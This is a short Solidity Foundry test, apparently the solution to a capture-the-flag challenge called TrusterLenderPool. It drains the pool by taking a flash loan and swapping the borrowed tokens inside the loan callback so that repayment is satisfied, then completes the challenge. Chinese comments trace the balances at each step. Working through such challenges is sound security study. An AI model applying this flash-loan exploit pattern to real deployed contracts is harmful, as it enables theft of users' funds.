// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/01.challenge/TrusterLenderPool.sol";

contract attackTest is Test {

    TrusterLenderPool public pool;
    Cert public token0;
    Cert public token1;

    function setUp() public{
        pool =  new TrusterLenderPool();
        token0 = Cert(address(pool.token0()));
        token1 = Cert(address(pool.token1()));
    }

    function test_isComplete() public {
        // 1.闪电贷得到10000的token0 [pool: 0token0,10000token1][me: 10000token0,0token1]
        pool.flashLoan(10000,address(this));
        // 4.授权给pool 10000个token1 [pool: 10000token0,0token1][me: 0token0,10000token1]
        token1.approve(address(pool),10000);
        // 5.将我们的10000个token1换成10000个token0 [pool: 0token0,10000token1][me: 10000token0,0token1]
        pool.swap(address(token0),10000);

        pool.Complete();
    }

    function receiveEther(uint256 amount)public{
        // 2.授权给pool 10000个token0 [pool: 0token0,10000token1][me: 10000token0,0token1]
        token0.approve(address(pool),10000);
        // 3.将我们的10000个token0换成10000个token1 [pool: 10000token0,0token1][me: 0token0,10000token1]
        pool.swap(address(token1),10000);
    }

}
